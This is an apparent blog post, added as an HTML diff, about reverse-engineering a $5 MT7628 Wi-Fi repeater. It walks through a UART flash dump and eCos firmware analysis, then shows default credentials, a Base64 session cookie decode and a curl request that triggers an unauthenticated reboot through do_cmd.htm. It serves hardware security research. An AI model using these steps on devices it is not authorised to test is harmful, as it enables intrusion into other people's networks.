@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Teardown &amp; Pwnage: Hacking a $5 Wi-Fi Repeater | WhyNot</title>
+<link rel="icon" href="favicon.svg" sizes="any" type="image/svg+xml" /><meta property="og:url" content="https://0rayn.github.io/WhyNot/posts/g-wpr/">
+  <meta property="og:site_name" content="WhyNot">
+  <meta property="og:title" content="Teardown & Pwnage: Hacking a $5 Wi-Fi Repeater">
+  <meta property="og:description" content="I - Beyond the Basics: The Hardware Profile Well if you follow those blog posts or know me u know I can’t resist cheap hardware; old? obsolete? naah this time brand new. I found a generic wall-plug wi-fi repeater for 5$ so of course I had to buy 2… Why 2? Why Not?
+Under the hood, it’s powered by a MediaTek MT7628KN System-on-Chip (MIPS32 24KEc core at 575 MHz). The system RAM is an 8 MB DDR1 module permanently baked inside the CPU package, and it uses a Macronix MX-12G 4 MB SPI flash chip for non-volatile storage.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-18T18:40:51+01:00">
+    <meta property="article:modified_time" content="2026-05-18T18:40:51+01:00">
+    <meta property="article:tag" content="#ReverseEngineering">
+    <meta property="article:tag" content="#HardwareHacking">
+    <meta property="article:tag" content="#MIPS">
+    <meta property="article:tag" content="#EmbeddedSystems">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Teardown & Pwnage: Hacking a $5 Wi-Fi Repeater">
+  <meta name="twitter:description" content="I - Beyond the Basics: The Hardware Profile Well if you follow those blog posts or know me u know I can’t resist cheap hardware; old? obsolete? naah this time brand new. I found a generic wall-plug wi-fi repeater for 5$ so of course I had to buy 2… Why 2? Why Not?
+Under the hood, it’s powered by a MediaTek MT7628KN System-on-Chip (MIPS32 24KEc core at 575 MHz). The system RAM is an 8 MB DDR1 module permanently baked inside the CPU package, and it uses a Macronix MX-12G 4 MB SPI flash chip for non-volatile storage.">
+
+      <link rel="stylesheet" href="/WhyNot/css/root.min.0e732b812b9751962e01a7c4798a1211cd5f8ac8abec7f99793fe306989e459f.css" integrity="sha256-DnMrgSuXUZYuAafEeYoSEc1fisir7H&#43;ZeT/jBpieRZ8=" crossorigin="anonymous">
+      <link rel="stylesheet" href="/WhyNot/css/bundle.min.d95a325399a05b50fe47dcf35b8229b8a2a014fcee5435cfb28204c6ac335fc5.css" integrity="sha256-2VoyU5mgW1D&#43;R9zzW4IpuKKgFPzuVDXPsoIExqwzX8U=" crossorigin="anonymous">
+
+      <script src="/WhyNot/js/bundle.a572f65de204e68be432faaae28ee3c07162ba9b0e5d98aa1a47148e31313a4a.js" integrity="sha256-pXL2XeIE5ovkMvqq4o7jwHFiupsOXZiqGkcUjjExOko=" crossorigin="anonymous"></script><script defer src="/WhyNot/js/search/flexsearch.compact.64594b125f7b78bdf4fa8316955922bbebb1cd6baef3f16654bfca20309f18f8.js" integrity="sha256-ZFlLEl97eL30&#43;oMWlVkiu&#43;uxzWuu8/FmVL/KIDCfGPg="></script>
+<script defer src="/WhyNot/js/search/search.8f530dd8babcb14f15ab7c8981ac96efc4b306094613be2dfff27d77e3557652.js" integrity="sha256-j1MN2Lq8sU8Vq3yJgayW78SzBglGE74t//J9d&#43;NVdlI="></script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Spectral:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,200;1,300;1,400;1,500;1,600;1,700;1,800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,200..800&family=Spectral:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,200;1,300;1,400;1,500;1,600;1,700;1,800&display=swap" rel="stylesheet">
+
+</head>
+<body class="notransition">
+  <div id="container">
+    <header id="main-header"><div role="navigation" aria-label="Main">
+  <div class="nav-left">
+    <a href="https://0rayn.github.io/WhyNot/" style="color: inherit;">WhyNot</a>
+  </div>
+  <div class="nav-right">
+    <div style="position:absolute;width:0px;height:0px;">
+      <div id="nav-dropdown-menu" class="hidden" href="#">
+    <div class="nav-item">
+      <a aria-current="true" class="ancestor" href="/WhyNot/posts/"
+      >Posts</a>
+    </div>
+    <div class="nav-item">
+      <a
+      >Features</a>
+    </div>
+    <div class="nav-item">
+      <a
+      >About</a>
+    </div>
+</div>
+    </div>
+    <a id="nav-dropdown-button" href="#"><svg width="20px" height="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M4 6H20M4 12H20M4 18H20" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+</a>
+    <div id="nav-menu">
+    <div class="nav-item">
+      <a aria-current="true" class="ancestor" href="/WhyNot/posts/"
+      >Posts</a>
+    </div>
+    <div class="nav-item">
+      <a
+      >Features</a>
+    </div>
+    <div class="nav-item">
+      <a
+      >About</a>
+    </div>
+</div>
+    <a id="theme-switcher" href="#">
+<svg class="light-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M12 3V4M12 20V21M4 12H3M6.31412 6.31412L5.5 5.5M17.6859 6.31412L18.5 5.5M6.31412 17.69L5.5 18.5001M17.6859 17.69L18.5 18.5001M21 12H20M16 12C16 14.2091 14.2091 16 12 16C9.79086 16 8 14.2091 8 12C8 9.79086 9.79086 8 12 8C14.2091 8 16 9.79086 16 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+
+<svg class="dark-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M3.32031 11.6835C3.32031 16.6541 7.34975 20.6835 12.3203 20.6835C16.1075 20.6835 19.3483 18.3443 20.6768 15.032C19.6402 15.4486 18.5059 15.6834 17.3203 15.6834C12.3497 15.6834 8.32031 11.654 8.32031 6.68342C8.32031 5.50338 8.55165 4.36259 8.96453 3.32996C5.65605 4.66028 3.32031 7.89912 3.32031 11.6835Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+</a>
+  </div>
+</div>
+</header>
+    <div class="flex grow">
+      <div id="main-pane">
+        <main id="main-content"><div class="single-header">
+<ol class="breadcrumbs" itemscope itemtype="https://schema.org/BreadcrumbList">
+    <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+      <a itemprop="item" href="/WhyNot/">
+        <span itemprop="name">Home</span>
+      </a>
+      <meta itemprop="position" content='1' />
+    </li>
+    <span>&nbsp»&nbsp</span>
+    <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+      <a itemprop="item" href="/WhyNot/posts/">
+        <span itemprop="name">Posts</span>
+      </a>
+      <meta itemprop="position" content='2' />
+    </li>
+    <span>&nbsp»&nbsp</span>
+</ol>
+<h1>Teardown &amp; Pwnage: Hacking a $5 Wi-Fi Repeater</h1><time class="dim" datetime="2026-05-18T18:40:51&#43;01:00">May 18, 2026</time><div class="term-container"><div class="tag">
+        <a href="/WhyNot/tags/%23reverseengineering/">##ReverseEngineering</a>
+      </div><div class="tag">
+        <a href="/WhyNot/tags/%23hardwarehacking/">##HardwareHacking</a>
+      </div><div class="tag">
+        <a href="/WhyNot/tags/%23mips/">##MIPS</a>
+      </div><div class="tag">
+        <a href="/WhyNot/tags/%23embeddedsystems/">##EmbeddedSystems</a>
+      </div></ol></div>
+  <section class="page-section"><h3 id="i---beyond-the-basics-the-hardware-profile">I - Beyond the Basics: The Hardware Profile</h3>
+<p>Well if you follow those blog posts or know me u know I can&rsquo;t resist cheap hardware; old? obsolete? naah this time brand new. I found a generic wall-plug wi-fi repeater for 5$ so of course I had to buy 2&hellip; Why 2? Why Not?</p>
+<p>Under the hood, it&rsquo;s powered by a MediaTek MT7628KN System-on-Chip (MIPS32 24KEc core at 575 MHz). The system RAM is an 8 MB DDR1 module permanently baked inside the CPU package, and it uses a Macronix MX-12G 4 MB SPI flash chip for non-volatile storage.</p>
+<p>It&rsquo;s the perfect target for the WNH initiative — cheap, obscure, and practically begging to be reverse-engineered.</p>
+<h3 id="ii---hunting-the-uart-multimeters-and-datasheets">II - Hunting the UART: Multimeters and Datasheets</h3>
+<p>Before you can pwn a system, you have to find a way to talk to it. Looking at the bare PCB, I spotted a suspicious unpopulated 3-pin header. In embedded systems, this is almost always the UART serial interface. But guessing the pinout is a great way to fry your USB-to-TTL adapter. We needed to be certain.</p>
+<p><strong>&raquo; Step 1: Finding True Ground</strong><br>
+The easiest anchor point on any board is Ground (GND). Instead of guessing, I pulled up the datasheet for the Macronix MX-12G SPI flash chip. The datasheet mapped out exactly which leg of the physical chip was tied to GND.</p>
+<p>I grabbed my multimeter, set it to continuity mode (the one that beeps), put the black probe on the flash chip&rsquo;s GND leg, and touched the red probe to the 3-pin header.<br>
+<em>Probe Pin 1&hellip;</em> <strong>BEEP</strong>.<br>
+Pin 1 was our true digital ground.</p>
+<p><strong>&raquo; Step 2: Identifying TX and RX</strong><br>
+Next, I needed to figure out which pin was Transmit (TX) and which was Receive (RX). I powered on the router, switched the multimeter to DC Voltage mode, and kept the black probe anchored on our newly found Pin 1 (GND).</p>
+<ul>
+<li><strong>Probing Pin 2:</strong> The multimeter read a steady <code>3.24V</code> while idle, with tiny fluctuations right as the board booted up. In serial logic, the TX line is held &ldquo;Active High&rdquo; (at voltage) when idle and pulls to 0V to send data. The fluctuations were the board blindly broadcasting its boot logs into the void. Pin 2 is <strong>TX</strong>.</li>
+<li><strong>Probing Pin 3:</strong> The multimeter read a flat <code>0V</code>. The RX line waits passively for incoming signals. Pin 3 is <strong>RX</strong>.</li>
+</ul>
+<p>So the final pinout for the debug header is:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Pin</th>
+          <th>Role</th>
+          <th>Idle Voltage</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>GND</td>
+          <td>0V</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>TX</td>
+          <td>3.24V</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>RX</td>
+          <td>0V</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>&raquo; Step 3: Baud Rate Roulette</strong><br>
+I hooked up my serial adapter (TX to RX, RX to TX, GND to GND) and fired up Minicom. But serial communication requires both sides to speak at the exact same speed.</p>
+<p>I started with the industry standard: <code>115200 baud</code>. The screen filled with alien garbage characters. Okay, too fast.<br>
+I dropped it to <code>9600 baud</code>. Dead silence.<br>
+I tried <code>38400</code>. More garbage.<br>
+Finally, I set it to <code>57600 baud</code> (8N1).</p>
+<p>Suddenly, pristine boot logs streamed across the terminal. Hooking up the serial adapter dropped me straight into an unlocked Ralink U-Boot (Version 4.3.0.0, built December 13 2017) console by simply sending the character <code>4</code> during autoboot. We were in.</p>
+<h3 id="iii---the-58-minute-flash-dump-trial-error-and-jackpots">III - The 58-Minute Flash Dump (Trial, Error, and Jackpots)</h3>
+<p>First rule of hardware hacking: back up the flash memory. I dropped into the <code>MT7628 #</code> prompt and tried to read the flash into memory. It didn&rsquo;t go well.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>MT7628 # spi read 0 400000
+</span></span><span style="display:flex;"><span>malloc error
+</span></span></code></pre></div><p>I didn&rsquo;t have enough memory. So, I tried reading in smaller chunks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>MT7628 # spi read 0 40000
+</span></span><span style="display:flex;"><span>malloc error
+</span></span></code></pre></div><p>Still the same error. I downgraded it all the way to a single byte, and then 256 bytes (hex <code>100</code>), just to see if it worked:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>MT7628 # spi read 0 1
+</span></span><span style="display:flex;"><span>read len: 1
+</span></span><span style="display:flex;"><span>ff 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MT7628 # spi read 0 100
+</span></span><span style="display:flex;"><span>read len: 256
+</span></span><span style="display:flex;"><span>ff 0 0 10 0 0 0 0 fd 0 0 10 0 0 0 0 d 3 0 10 0 0 0 0 b 3 0 10 0 0 0 0 9 3 0 10 0 0 0 0 7 3 0 10 0 0 0 0 5 
+</span></span></code></pre></div><p>It worked, but reading the whole 4MB in 256-byte chunks would take forever. After looking into the architecture, I found that MediaTek&rsquo;s SPI flash is usually automatically memory-mapped directly into the CPU&rsquo;s uncached virtual memory segment (kseg1) starting at physical address <code>0xBC000000</code>. Let&rsquo;s compare that address to our <code>spi read</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>MT7628 # md.b BC000000 20
+</span></span><span style="display:flex;"><span>bc000000: ff 00 00 10 00 00 00 00 fd 00 00 10 00 00 00 00    ................
+</span></span><span style="display:flex;"><span>bc000010: 0d 03 00 10 00 00 00 00 0b 03 00 10 00 00 00 00    ................
+</span></span></code></pre></div><p>=&raquo;&gt; JACKPOT.</p>
+<p>Same bytes, no chunking limit. I logged the full UART data stream into a file using minicom&rsquo;s built-in capture. 58 minutes later (58:00.41 to be exact hhhhh), I had a 20MB text file. I cleared out the junk and converted the hex back to binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>awk -F: <span style="color:#e6db74">&#39;/^[0-9a-fA-F]{8}:/ {print substr($2, 1, 48)}&#39;</span> raw_flash_steam.txt | xxd -r -p &gt; factory_backup.bin
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜ stat -c %s factory_backup.bin
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4194304</span>
+</span></span></code></pre></div><p>Exactly 4,194,304 bytes — a perfect 4MB <code>factory_backup.bin</code>. We have the full flash.</p>
+<h3 id="iv---the-linux-lie--binwalk-dissection">IV - The &ldquo;Linux&rdquo; Lie &amp; Binwalk Dissection</h3>
+<p>Running <code>binwalk</code> on the backup immediately revealed something interesting:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>DECIMAL       HEXADECIMAL     DESCRIPTION
+</span></span><span style="display:flex;"><span>88976         0x15B90         U-Boot version string, &#34;U-Boot 1.1.3 (Dec 13 2017 - 04:47:08)&#34;
+</span></span><span style="display:flex;"><span>89687         0x15E57         HTML document header
+</span></span><span style="display:flex;"><span>203648        0x31B80         eCos RTOS string reference: &#34;ECOSAPClient&#34;
+</span></span><span style="display:flex;"><span>327680        0x50000         uImage header, ... OS: Linux, CPU: MIPS, image name: &#34;zxrouter&#34;
+</span></span><span style="display:flex;"><span>337024        0x52480         LZMA compressed data, ...
+</span></span><span style="display:flex;"><span>2186128       0x215B90        U-Boot version string, &#34;U-Boot 1.1.3 (Dec 13 2017 - 04:47:08)&#34;
+</span></span><span style="display:flex;"><span>2300800       0x231B80        eCos RTOS string reference: &#34;ECOSAPClient&#34;
+</span></span><span style="display:flex;"><span>2424832       0x250000        uImage header, ... OS: Linux, CPU: MIPS, image name: &#34;zxrouter&#34;
+</span></span><span style="display:flex;"><span>2434176       0x252480        LZMA compressed data, ...
+</span></span></code></pre></div><p>Two things stand out immediately. First, the entire flash layout is mirrored perfectly — the same structure repeats twice. This is a Dual-Image Failover layout (A/B partition scheme): if one image is corrupted, the device boots from the other. Second, notice how the uImage header proudly declares <code>OS: Linux</code>&hellip; but also references <code>ECOSAPClient</code> in the same binary. That contradiction was worth pulling on.</p>
+<p>Running <code>strings</code> on the binary gave away more than expected. The default SSID (<code>BFROS_WIFI</code>), the hardcoded web management username (<code>admin</code>), the U-Boot network config — and this gem buried in the environment variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>bootcmd=tftp
+</span></span><span style="display:flex;"><span>bootdelay=5
+</span></span><span style="display:flex;"><span>baudrate=57600
+</span></span><span style="display:flex;"><span>ethaddr=&#34;00:AA:BB:CC:DD:10&#34;
+</span></span><span style="display:flex;"><span>ipaddr=192.168.11.8
+</span></span><span style="display:flex;"><span>serverip=192.168.11.11
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>AAAAAA
+</span></span><span style="display:flex;"><span>BBBBBB
+</span></span><span style="display:flex;"><span>admin
+</span></span><span style="display:flex;"><span>BFROS_WIFI
+</span></span><span style="display:flex;"><span>admin
+</span></span></code></pre></div><p>That MAC address — <code>00:AA:BB:CC:DD:10</code> — is a fake placeholder that ships in the firmware defaults. Every device that never gets a proper MAC assigned is broadcasting with a non-unique, fully predictable hardware address. Fingerprinting these on any network is trivial.</p>
+<p>And <code>AAAAAA</code>, <code>BBBBBB</code> sitting there next to <code>admin</code>? Developer test placeholders that shipped straight to production. Twenty years of firmware quality right there.</p>
+<p>Now, back to the &ldquo;Linux&rdquo; claim. I tried to extract the root filesystem from the LZMA blob at offset <code>0x52480</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>factory_backup.bin of<span style="color:#f92672">=</span>filesystem.lzma bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> skip<span style="color:#f92672">=</span><span style="color:#ae81ff">337024</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">1762176</span>
+</span></span><span style="display:flex;"><span>&gt; lzma -d filesystem.lzma
+</span></span><span style="display:flex;"><span>lzma: filesystem.lzma: Compressed data is corrupt
+</span></span></code></pre></div><p>Legacy MediaTek SDKs frequently used non-standard LZMA headers, so I used <code>binwalk -e</code> to force the extraction, which pulled out a chunk called <code>52480</code>. The <code>file</code> command thought it was &ldquo;Targa image data&rdquo;, but running binwalk <em>again</em> on <code>52480</code> revealed the truth:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>116           0x74            eCos kernel exception handler, architecture: MIPSEL
+</span></span><span style="display:flex;"><span>1846269       0x1C2BFD        eCos RTOS string reference: &#34;ecos/rt_profile.c&#34;
+</span></span><span style="display:flex;"><span>1864136       0x1C71C8        eCos RTOS string reference: &#34;ecos_start()&#34;
+</span></span></code></pre></div><p>This thing doesn&rsquo;t even run Linux hhhhhhh. The <code>OS: Linux</code> tag in the uImage header is a lie they told U-Boot so it would boot the image without complaining — U-Boot doesn&rsquo;t verify the OS type, it just reads the field and moves on. The actual OS is <strong>eCos RTOS</strong>, a real-time embedded operating system last seriously updated around 2009.</p>
+<p>Because eCos compiles the OS, network stack, and application layer into a single flat binary executable, there is no <code>/bin</code>, no <code>/etc</code>, no shell in the traditional sense. Everything runs bare-metal as one monolithic blob. The copyright string found in the image: <code>Copyright (c) 2006 Klaus Hartl</code>. 20 years ago.</p>
+<h3 id="v---the-live-ecos-shell--nvram-plaintext">V - The Live eCos Shell &amp; NVRAM Plaintext</h3>
+<p>While messing around with the UART connection, I noticed that pressing <code>4</code> isn&rsquo;t even the only way in. If you just hit Enter at the boot prompt — or do nothing at all and let it time out — you drop straight into a live debugging shell from eCos itself:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>CMD&gt;cd os
+</span></span><span style="display:flex;"><span>OS&gt;ls
+</span></span><span style="display:flex;"><span>thread      mem         spi         reg         cpuload     cpubusy
+</span></span></code></pre></div><p>I ran <code>prof show</code> and dumped the entire configuration table. It returned over 300 lines of configuration defaults. Here is exactly where the security completely falls apart:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>SYS_ADMPASS=admin
+</span></span><span style="display:flex;"><span>SYS_USERS=admin
+</span></span><span style="display:flex;"><span>WLN_WPAPSK1=88888888
+</span></span><span style="display:flex;"><span>L2T_PASS=7628Kap
+</span></span><span style="display:flex;"><span>FW_EN=0
+</span></span></code></pre></div><p>The passwords sit in plain text inside flash memory. No hashing, no salting, nothing. And notice <code>FW_EN=0</code> — the firewall is <strong>completely disabled</strong> out of the box.</p>
+<p>To be clear about the layers here: the browser stores a Base64-encoded copy of the password in a cookie so the admin panel session persists. The hardware itself stores the actual plaintext password physically written to the flash chip. Both are fully readable by anyone with 5 minutes and basic tools.</p>
+<h3 id="vi---decimating-the-web-layer">VI - Decimating the Web Layer</h3>
+<p>To analyze the web interface, I used <code>dd</code> to carve the web assets out of the <code>52480</code> chunk and <code>grep</code> to pull the JavaScript logic:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings web_assets.dat | grep -E <span style="color:#e6db74">&#34;(function|var|input|action)&#34;</span> &gt; web_logic.txt
+</span></span></code></pre></div><p>Here are the catastrophic vulnerabilities I found:</p>
+<h4 id="vulnerability-1-hardcoded-defaults-in-html">Vulnerability 1: Hardcoded Defaults in HTML</h4>
+<p>They literally hardcoded the default credentials right into the login form inputs in the HTML source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">maxlength</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pcPassword&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pcPassword&#34;</span> <span style="color:#a6e22e">maxlength</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>&gt;
+</span></span></code></pre></div><p>The password field ships pre-filled with <code>admin</code>. You don&rsquo;t even have to type anything.</p>
+<h4 id="vulnerability-2-fake-encryption--cookie-theft">Vulnerability 2: Fake &ldquo;Encryption&rdquo; &amp; Cookie Theft</h4>
+<p>When you log in, the JavaScript does this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">auth</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Basic &#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">base64_encode</span>(<span style="color:#e6db74">&#34;admin:&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">pcPassword</span>.<span style="color:#a6e22e">value</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Authorization=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">escape</span>(<span style="color:#a6e22e">auth</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;;path=/&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">submit</span>();
+</span></span></code></pre></div><p>Base64 is encoding, not encryption. The session &ldquo;token&rdquo; is literally just <code>admin:88888888</code> encoded to <code>YWRtaW46ODg4ODg4ODg=</code>. Anyone who intercepts this cookie can decode it instantly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;YWRtaW46ODg4ODg4ODg=&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># admin:88888888</span>
+</span></span></code></pre></div><p>Making this worse: the cookie has no <code>HttpOnly</code> flag. That means JavaScript running in the page can read it freely — which becomes critical in Vulnerability 4.</p>
+<h4 id="vulnerability-3-unauthenticated-rce--the-broken-parser">Vulnerability 3: Unauthenticated RCE &amp; The Broken Parser</h4>
+<p>The UI executes hardware operations via hidden parameters sent to <code>do_cmd.htm</code>. The official frontend uses a form like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frmSetup&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FLG&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;CMD&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SYS_CONF&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;CCMD&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span></code></pre></div><p>There is zero authentication check on this endpoint. I tested it with <code>curl</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -v <span style="color:#e6db74">&#34;http://192.168.11.1/do_cmd.htm?CMD=SYS_CONF&amp;CCMD=101&#34;</span>
+</span></span></code></pre></div><p>This bypassed authentication entirely and forced a hard hardware reboot. The UART confirmed it immediately:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>******************************
+</span></span><span style="display:flex;"><span>Software System Reset Occurred
+</span></span><span style="display:flex;"><span>******************************
+</span></span><span style="display:flex;"><span>U-Boot 1.1.3 (Dec 13 2017 - 04:47:08)
+</span></span><span style="display:flex;"><span>Board: Ralink APSoC DRAM:   8 MB
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>##### The CPU freq = 575 MHZ ####
